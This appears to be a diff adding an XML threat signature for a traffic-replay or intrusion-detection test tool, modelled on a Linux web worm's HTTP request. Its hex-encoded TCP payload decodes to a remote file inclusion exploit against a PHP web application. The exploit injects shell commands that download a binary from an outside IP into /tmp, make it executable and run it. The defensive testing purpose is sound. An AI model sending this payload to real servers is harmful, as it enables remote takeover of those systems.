@@ -1,0 +1,82 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Net-Worm.Linux.Mare.E worm HTTP Payload Vulnerability"/>
+    <EngDesc display="true" value="This threat is one of the HTTP requests for the Net-Worm.Linux.Mare.E Worm.  Net-Worm.Linux.Mare.E  is a worm that exploits well known web application holes."/>
+    <Intent display="true">
+      <item value="Unauthorized_Access"/>
+      <item value="Unauthorized_Use"/>
+      <item value="Command_Injection"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true"/>
+    <Known_Products_Affected display="true"/>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="http://www.viruslist.com/en/viruses/encyclopedia?virusid=112576"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID value="000001099028753800c000a80001003c7a301bae" display="true"/>
+    <Revision value="1" display="true"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="integrity"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632761227854062500"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1140584904" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="H"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="H"/>
+    </for>
+  </Loops>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="47455420696E646578322E7068703F5F524551554553545B6F7074696F6E5D3D636F6D5F636F6E74656E74265F524551554553545B4974656D69645D3D3126474C4F42414C533D266D6F73436F6E6669675F6162736F6C7574655F706174683D687474703A2F2F3230392E3132332E31362E33342F636D642E6769663F26636D643D6364252532302F746D703B77676574252532303230392E3132332E31362E33342F676963756D7A3B63686D6F642525323037343425253230676963756D7A3B2E2F676963756D7A3B6563686F252532305959593B6563686F7C2020485454502F312E310D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
